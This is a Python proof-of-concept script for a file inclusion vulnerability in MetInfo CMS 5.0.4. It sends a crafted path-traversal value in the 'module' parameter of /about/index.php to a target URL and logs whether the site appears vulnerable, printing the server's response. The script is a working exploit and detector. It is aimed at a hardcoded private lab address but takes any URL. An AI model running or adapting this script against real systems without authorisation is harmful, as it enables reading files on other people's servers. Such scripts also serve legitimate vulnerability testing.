#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import fire
from loguru import logger

import requests

headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:100.0) " \
        "Gecko/20100101 Firefox/100.0"
}

class Metinfo(object):
    """

    Usage:
        python3 metinfo_poc.py metinfo_file_inclusion --url http://10.4.7.4/metinfo_5.0.4
    """
    def __init__(self):
        pass

    def metinfo_file_inclusion(self, url, file_path = "../favicon.ico"):
        """
        Title Metinfo - File Inclusion
        Version: V5.0.4
        """
        uri = f"/about/index.php?fmodule=7&module={file_path}"
        character = "888888888888888888888888888888"
        response = requests.get(url + uri, headers = headers)
        if response.status_code == 200 and character in response.text:
            logger.info(f"{url} 疑似存在 Metinfo V5.0.4 File Inclusion 漏洞")
            logger.info(response.text)
            return True
        else:
            logger.info(f"{url} 疑似不存在 Metinfo V5.0.4 File Inclusion 漏洞！")
            return False

    def main(self):
        url = "http://10.4.7.4/metinfo_5.0.4"
        self.metinfo_file_inclusion(url)


if __name__ == '__main__':
    fire.Fire(Metinfo)